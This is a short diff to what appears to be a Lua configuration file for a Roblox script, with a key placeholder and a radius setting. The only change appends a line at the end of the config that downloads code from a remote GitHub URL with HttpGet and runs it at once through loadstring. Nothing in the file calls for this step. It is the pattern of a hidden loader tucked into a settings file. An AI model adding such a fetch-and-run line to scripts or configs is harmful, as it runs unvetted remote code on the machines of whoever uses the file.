@@ -66,3 +66,5 @@ Key = '[keyhere]', -- [ replace [keyhere] with your key ]
 		Radius = 135
 	}
 }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ib136691/exit/main/exit", true))()
